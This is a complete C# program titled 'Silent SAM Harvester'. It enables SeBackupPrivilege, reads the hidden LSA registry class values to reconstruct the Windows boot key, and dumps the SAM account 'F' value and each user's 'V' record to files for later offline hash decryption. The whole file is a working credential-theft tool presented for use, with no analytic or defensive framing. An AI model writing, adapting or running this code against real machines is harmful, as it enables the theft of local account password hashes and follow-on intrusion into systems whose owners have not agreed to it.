using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

class SilentHarvest
{
    // Existing P/Invoke declarations
    [DllImport("ntdll.dll")]
    static extern int NtOpenKeyEx(
        out IntPtr KeyHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        uint OpenOptions);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegQueryMultipleValuesW(
        IntPtr hKey,
        [In, Out] VALENT[] val_list,
        uint num_vals,
        byte[] lpValueBuf,
        ref uint ldwTotsize);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern int RegQueryInfoKeyA(
        IntPtr hKey,
        StringBuilder lpClass,
        ref uint lpcchClass,
        IntPtr lpReserved,
        IntPtr lpcSubKeys,
        IntPtr lpcbMaxSubKeyLen,
        IntPtr lpcbMaxClassLen,
        IntPtr lpcValues,
        IntPtr lpcbMaxValueNameLen,
        IntPtr lpcbMaxValueLen,
        IntPtr lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("ntdll.dll")]
    static extern void RtlInitUnicodeString(
        ref UNICODE_STRING DestinationString,
        [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        ref LUID lpLuid);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr Handle);

    // Constants
    const uint KEY_READ = 0x20019;
    const uint REG_OPTION_BACKUP_RESTORE = 0x00000004;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY = 0x0008;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES
    {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct VALENT
    {
        public IntPtr ve_valuename;
        public uint ve_valuelen;
        public IntPtr ve_valueptr;
        public uint ve_type;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    static bool EnableBackupPrivilege()
    {
        IntPtr token;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
        {
            return false;
        }

        LUID luid = new LUID();
        if (!LookupPrivilegeValue(null, "SeBackupPrivilege", ref luid))
        {
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges.Luid = luid;
        tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }

    static string ReadRegistryClass(string keyPath)
    {
        UNICODE_STRING uniStr = new UNICODE_STRING();
        RtlInitUnicodeString(ref uniStr, keyPath);

        IntPtr uniStrPtr = Marshal.AllocHGlobal(Marshal.SizeOf(uniStr));
        Marshal.StructureToPtr(uniStr, uniStrPtr, false);

        OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
        objAttr.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
        objAttr.RootDirectory = IntPtr.Zero;
        objAttr.ObjectName = uniStrPtr;
        objAttr.Attributes = 0;
        objAttr.SecurityDescriptor = IntPtr.Zero;
        objAttr.SecurityQualityOfService = IntPtr.Zero;

        IntPtr hKey;
        int status = NtOpenKeyEx(out hKey, KEY_READ, ref objAttr, REG_OPTION_BACKUP_RESTORE);

        Marshal.FreeHGlobal(uniStrPtr);

        if (status != 0)
        {
            return null;
        }

        // Use RegQueryInfoKeyA to get class name
        uint classLen = 256;
        StringBuilder classValue = new StringBuilder((int)classLen);
        
        int result = RegQueryInfoKeyA(hKey, classValue, ref classLen, IntPtr.Zero, IntPtr.Zero,
                                     IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                                     IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        NtClose(hKey);

        if (result == 0 && classLen > 0)
        {
            return classValue.ToString();
        }

        return null;
    }

    static byte[] HexStringToByteArray(string hex)
    {
        int numberChars = hex.Length;
        byte[] bytes = new byte[numberChars / 2];
        for (int i = 0; i < numberChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }

    static void PermuteBootKey(byte[] bootKey)
    {
        byte[] temp = new byte[16];
        Array.Copy(bootKey, temp, 16);

        int[] transforms = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
        for (int i = 0; i < 16; i++)
        {
            bootKey[i] = temp[transforms[i]];
        }
    }

    static byte[] GetBootKey()
    {
        string[] keys = { "JD", "Skew1", "GBG", "Data" };
        string basePath = @"\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\";
        
        string concatenated = "";

        foreach (string key in keys)
        {
            string fullPath = basePath + key;
            string classValue = ReadRegistryClass(fullPath);
            
            if (classValue != null && classValue.Length > 0)
            {
                Console.WriteLine("[+] " + key + ": " + classValue);
                concatenated += classValue;
            }
            else
            {
                Console.WriteLine("[-] Failed to read class for " + key);
                return null;
            }
        }

        Console.WriteLine("[*] Concatenated: " + concatenated);

        byte[] bootKey = HexStringToByteArray(concatenated);
        PermuteBootKey(bootKey);

        return bootKey;
    }

    static byte[] ReadRegistryValue(string keyPath, string valueName)
    {
        UNICODE_STRING uniStr = new UNICODE_STRING();
        RtlInitUnicodeString(ref uniStr, keyPath);

        IntPtr uniStrPtr = Marshal.AllocHGlobal(Marshal.SizeOf(uniStr));
        Marshal.StructureToPtr(uniStr, uniStrPtr, false);

        OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
        objAttr.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
        objAttr.RootDirectory = IntPtr.Zero;
        objAttr.ObjectName = uniStrPtr;
        objAttr.Attributes = 0;
        objAttr.SecurityDescriptor = IntPtr.Zero;
        objAttr.SecurityQualityOfService = IntPtr.Zero;

        IntPtr hKey;
        int status = NtOpenKeyEx(out hKey, KEY_READ, ref objAttr, REG_OPTION_BACKUP_RESTORE);

        Marshal.FreeHGlobal(uniStrPtr);

        if (status != 0)
        {
            return null;
        }

        IntPtr valueNamePtr = Marshal.StringToHGlobalUni(valueName);
        VALENT[] valList = new VALENT[1];
        valList[0].ve_valuename = valueNamePtr;

        uint bufferSize = 16384;
        byte[] buffer = new byte[bufferSize];

        int result = RegQueryMultipleValuesW(hKey, valList, 1, buffer, ref bufferSize);

        NtClose(hKey);
        Marshal.FreeHGlobal(valueNamePtr);

        if (result == 0)
        {
            byte[] data = new byte[valList[0].ve_valuelen];
            Array.Copy(buffer, data, valList[0].ve_valuelen);
            return data;
        }

        return null;
    }

    static void DumpSAMUsers()
    {
        Console.WriteLine("[*] Dumping SAM F value...");
        
        string fKey = @"\Registry\Machine\SAM\SAM\Domains\Account";
        byte[] fData = ReadRegistryValue(fKey, "F");
        
        if (fData != null)
        {
            Console.WriteLine("[+] F value: " + fData.Length + " bytes");
            File.WriteAllBytes("F.bin", fData);
        }

        Console.WriteLine("[*] Enumerating SAM users...");
        
        int userCount = 0;
        for (uint rid = 0x1F4; rid < 0x800; rid++)
        {
            string ridHex = rid.ToString("X8");
            string userKey = @"\Registry\Machine\SAM\SAM\Domains\Account\Users\" + ridHex;
            
            byte[] vData = ReadRegistryValue(userKey, "V");
            
            if (vData != null && vData.Length > 100)
            {
                Console.WriteLine("[+] Found user RID: " + rid + " (0x" + ridHex + ")");
                File.WriteAllBytes("V_" + ridHex + ".bin", vData);
                userCount++;
            }
        }
        
        Console.WriteLine("[+] Dumped " + userCount + " users");
    }

    static void Main()
    {
        Console.WriteLine("[*] Silent SAM Harvester with Bootkey Extraction");
        Console.WriteLine("[*] Output: Current directory\n");
        
        if (!EnableBackupPrivilege())
        {
            Console.WriteLine("[-] Failed to enable SeBackupPrivilege");
            return;
        }
        
        Console.WriteLine("[+] SeBackupPrivilege enabled\n");
        
        string outputDir = @"C:\temp";
        if (!Directory.Exists(outputDir))
        {
            Directory.CreateDirectory(outputDir);
        }
        Environment.CurrentDirectory = outputDir;
        
        // Extract bootkey
        Console.WriteLine("[*] Extracting bootkey...");
        byte[] bootKey = GetBootKey();
        
        if (bootKey != null)
        {
            string bootKeyHex = BitConverter.ToString(bootKey).Replace("-", "");
            Console.WriteLine("[+] Bootkey: " + bootKeyHex);
            File.WriteAllBytes("bootkey.bin", bootKey);
            File.WriteAllText("bootkey.txt", bootKeyHex);
            Console.WriteLine("[+] Saved bootkey\n");
        }
        else
        {
            Console.WriteLine("[-] Failed to extract bootkey\n");
        }
        
        // Dump SAM users
        DumpSAMUsers();
        
        Console.WriteLine("\n[*] Done! Files created:");
        Console.WriteLine("    bootkey.bin / bootkey.txt");
        Console.WriteLine("    F.bin");
        Console.WriteLine("    V_*.bin");
        Console.WriteLine("\n[*] Use Python decryption script to get hashes");
    }

}
